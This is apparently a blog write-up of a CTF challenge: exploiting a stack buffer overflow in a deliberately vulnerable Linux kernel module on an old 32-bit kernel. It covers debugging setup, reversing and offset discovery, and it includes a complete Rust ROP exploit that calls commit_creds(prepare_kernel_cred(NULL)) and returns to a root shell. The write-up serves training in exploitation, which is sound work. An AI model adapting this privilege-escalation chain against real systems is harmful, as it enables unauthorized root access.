+++
title = "Pwn: Linux Kernel x86 - Exploiting a Buffer Overflow with ROP"
date = "2025-03-04T11:31:21+01:00"
author = "yocvito"
authorTwitter = "yocvito" #do not include @
cover = ""
tags = ["write-up", "pwn", "linux-kernel", "x86"]
keywords = ["write-up", "pwn", "linux-kernel", "x86"]
description = "A simple linux kernel stack overflow challenge to train basic kernel ROP exploits"
showFullContent = false
readingTime = false
hideComments = false
+++

# PWN: LinKern x86 - Basic ROP

We are tasked with exploiting an LKM that does nothing interesting except exposing a buffer overflow vulnerability when writing to the character device at `/dev/bof` _(this is showed in the challenge `README` file)_ 

## Setting up debugging environment

First of all, we need to setup a debugging environment so we can try and test on our system directly.

For this challenge, we can download the following files for testing locally:
- `bzImage`: the image of the kernel
- `initramfs.img`: the filesystem (containing the buggy LKM)
- `._start_vm`: **QEMU** initialization script

Actually, the system doesn't restricts reading from `/proc/kallsyms` which means we can already uncover kernel functions addresses without relying on a **leak** + offset calculation. Moreover, **KASLR** isn't enable which allows us to get the same kernel addresses over reboot. All of this makes kernel image (`bzImage`) not being necessarily usefull there for reversing.

What we are more interested in is getting the buggy LKM to analyze it. We can simply decompress the _initramfs_ and get it from there:

```shell
$ file initramfs.img 
initramfs.img: gzip compressed data, was "initramfs", last modified: Mon Mar  3 13:57:13 2025, from Unix, original size modulo 2^32 1966592
$ mv initramfs.img initramfs.gz && gunzip initramfs.gz
$ mkdir fs
$ cpio -ivD fs/ < initramfs
$ ls fs/
bin  dev  etc  home  init  lib  lib64  linuxrc  mnt  proc  root  sbin  sys  usr
$ find fs/ -iname "*.ko"
fs/lib/modules/4.10.3/rootme/ch39.ko
```

Now that we have all the files we want to analyze, we need to actually setup the runtime environment where we will test our exploit. As the challenge already provides a script to emulate the kernel using **qemu**, we will simply use this one, which we modify as the following (we just change paths, user and remove passwd file):

```bash
#!/bin/bash -p

PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
CHALLPATH=.

STTY=$(stty -g)
stty intr ^-

TEMP=$(mktemp -d -p /var/tmp/)
chgrp ${USER} ${TEMP}
chmod 770 ${TEMP}

echo ""
echo "A share will be available: host:${TEMP} -> guest:/mnt/share"
echo "Launching the vulnerable machine..."
echo ""

qemu-system-x86_64 \
    -no-reboot \
    -m 32M \
    -cpu kvm64,+smep,check \
    -nographic \
    -kernel $CHALLPATH/bzImage \
    -append 'console=ttyS0 loglevel=3 oops=panic panic=1' \
    -monitor /dev/null \
    -initrd $CHALLPATH/initramfs.img \
    -snapshot \
    -fsdev local,id=exp1,path=${TEMP},security_model=mapped -device virtio-9p-pci,fsdev=exp1,mount_tag=rootme

rm -rf "${TEMP}" 2> /dev/null
stty "${STTY}"
```

We can now start our testing environment (run `./start_vm.sh`):

![Crashing the test env](/img/pwn-linkern-rop/test-env.png)


## Analyzing the LKM

Let's start analyzing the LKM to understand where the vuln resides. We open the `ch39.ko` file in IDA. 

The `init_module` function (entry point of an LKM) is quite simple, it registers a character device at `/dev/bof` with a `struct file_operations` structure containing the `bof_<read|write|open|close>` function pointers.

![LKM init](/img/pwn-linkern-rop/lkm-init.png)

As we know the overflow is triggered by writing to the char device, the vulnerability has to be in `bof_write`. Let's analyze it (the comments are generated by [Better-printk](https://github.com/ZjW1nd/Better-printk-IDA9) plugin).

![`bof_write` analysis](/img/pwn-linkern-rop/bof-write.png)

We clearly see that if `a1` is the size of the input and `a2` our input, there is a buffer overflow on the `sbuf` stack buffer variable because there is no check to ensure `a1` doesn't go beyong `sizeof(sbuf)`.

By statically analyzing the function prelude, we can guess the offset from `sbuf` start to the return address could be 40 bytes but let's confirm it dynamically.

```bash
$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

![return address offset finding](/img/pwn-linkern-rop/return-address.png)

```bash
$ cyclic -l 0x6161616b
40
```

We can confirm that we are able to control the return address of the function, allowing us to divert the control flow to do nasty things (for example escalating privileges to root).

## Exploiting the vulnerability

So now that we can divert control flow, what do we want to do? Well, as stated before escalating our privileges to root would be interesting. In the linux kernel, changing a process credentials to root is as simple as calling `commit_creds(prepare_kernel_cred(NULL))`.
This is because until linux kernel release 6.2.0, the kernel uses the `init` task (pid=1) credentials if no arguments (`NULL`) is provided to `prepare_kernel_cred` and as init will likely be run as root, this effectively sets the current process creds to root.

In order to build our ROPchain, we need to understand how the `prepare_kernel_cred` and `commit_creds` functions takes their argument. Both functions uses a particular calling convention similar to **fastcall** ([IDA label it as `__usercall`](https://hex-rays.com/blog/igors-tip-of-the-week-51-custom-calling-conventions)), where arguments are passed using registers. Functions takes their first argument from `eax` while the return value is also hold in `eax`.  

![prepare_kernel_cred](/img/pwn-linkern-rop/prepare-creds.png)

This means for a successfull ROPchain, we need to:
- set `eax` to 0 (NULL)
    - _there is a relevant gadget for this in the kernel image at address `0xc1371479` which pop stack value into eax and other registers (I did not search a lot but it might be possible to find a gadget popping less values)_
- call `prepare_kernel_cred`
- call `commit_creds` (argument is the return value of `prepare_kernel_cred`, nothing to setup)
- return to userspace (where we spawn a shell with the new credentials)

Returning to userspace can be done by calling the `iret` instructions, which retrieves the necessary information for returning to userspace from the stack. The structure containing these informations has the following layout:

```C
struct trap_frame {
    uint32_t eip; // where we return
    uint32_t cs;
    uint32_t eflags;
    uint32_t esp;
    uint32_t ss;
};
```

So what we need to do for a successfull return to userspace is pointing the `eip` of the `trap_frame` structure to the address of a function of our program that will spawn `/bin/sh`. As our ROPchain changes the current process credentials to root, this effectively spawn a root shell for us. We also need to take care all the other fields are valid.

A relevant gadget for the `iret` instruction is at address `0xC101F504` in the kernel image. I essentially found these gadgets using either `ROPgadget` or the built-in IDA search feature. The addresses in the binary are the same as in memory because there is no kASLR. So we could still look at kallsyms and calculate offsets to the gadget from that, but it's not necessary there.

Finally, this allows us to build the following exploit script in Rust:

```Rust
use std::{arch::asm, fs::OpenOptions, io::Write};
use libc::geteuid;

#[repr(C, packed)]
#[derive(Copy, Clone)]
struct TrapFrame {
    eip: u32,
    cs: u32,
    eflags: u32,
    esp: u32,
    ss: u32
}

impl TrapFrame {
    pub fn to_bytes(self) -> [u8; 20] {
        unsafe { std::mem::transmute(self) }
    }
}

#[unsafe(no_mangle)]
extern "C" fn spawn_shell() {
    if unsafe { geteuid() } != 0 {
        println!("Seems like I get call but we're not root yet, very sad... :(");
        std::process::exit(1);
    }
    println!("Got root !!! Spawning shell...");
    std::process::Command::new("/bin/sh")
        .spawn().unwrap()
        .wait().unwrap();
}

fn get_cs() -> u32 {
    let mut cs: u32;
    unsafe {
        asm!("push cs",
            "pop {cs:e}",
            cs = out(reg) cs);
    }
    cs
}

fn get_eflags() -> u32 {
    let mut eflags: u32;
    unsafe {
        asm!("pushf",
            "pop {eflags:e}",
            eflags = out(reg) eflags);
    }
    eflags
}

fn get_esp() -> u32 {
    let mut esp: u32;
    unsafe {
        asm!("push esp",
            "pop {esp:e}",
            esp = out(reg) esp);
    }
    esp
}

fn get_ss() -> u32 {
    let mut ss: u32;
    unsafe {
        asm!("push ss",
            "pop {ss:e}",
            ss = out(reg) ss);
    }
    ss
}

fn main() {

    let mut f = match OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/bof") {
            Ok(file) => file,
            Err(err) => panic!("Error: {}", err),
        };

    let commit_creds_ea: u32 = 0xc1070e80;
    let prepare_kernel_cred_ea: u32 = 0xc10711f0;

    let g_pop_eax_ea: u32 = 0xc1371479; // pop eax,edx,ebx,esi,edi,ebp
    let g_iret_ea: u32 = 0xC101F504;

    let mut payload = b"A".repeat(40);
    payload.extend_from_slice(g_pop_eax_ea.to_le_bytes().as_ref());
    payload.extend_from_slice(0_u32.to_le_bytes().as_ref());
    payload.extend_from_slice(0_u32.to_le_bytes().as_ref());
    payload.extend_from_slice(0_u32.to_le_bytes().as_ref());
    payload.extend_from_slice(0_u32.to_le_bytes().as_ref());
    payload.extend_from_slice(0_u32.to_le_bytes().as_ref());
    payload.extend_from_slice(0_u32.to_le_bytes().as_ref());
    payload.extend_from_slice(prepare_kernel_cred_ea.to_le_bytes().as_ref());
    payload.extend_from_slice(commit_creds_ea.to_le_bytes().as_ref());
    payload.extend_from_slice(g_iret_ea.to_le_bytes().as_ref());
    let tf = TrapFrame {
        eip: spawn_shell as *const () as u32,
        cs: get_cs(),
        eflags: get_eflags(),
        esp: get_esp(),
        ss:get_ss() 
    };
    payload.extend_from_slice(tf.to_bytes().as_ref());

    println!("@spawn_shell = {:p}", spawn_shell as *const ());

    println!("ROP chain:");
    for chunk in payload.chunks(4) {
        println!("\t{:04x}", u32::from_le_bytes(chunk.try_into().unwrap())); 
    }

    f.write_all(&payload).unwrap();
}
```

Thanks to Rust building system, we can easely compile the exploit as a static binary for the target system:

```shell
mkdir exploit && cd exploit
cargo init .
cargo add libc
# copy code to src/main.rs
# ...

# make sure target is available
rustup target add i686-unknown-linux-musl

# build
cargo build --target i686-unknown-linux-musl --release

# then upload the binary to the target system
# binary is found at ./target/i686-unknown-linux-musl/release/exploit
```

Then we run the binary and get a root shell !

![Got root](/img/pwn-linkern-rop/got-root.png)








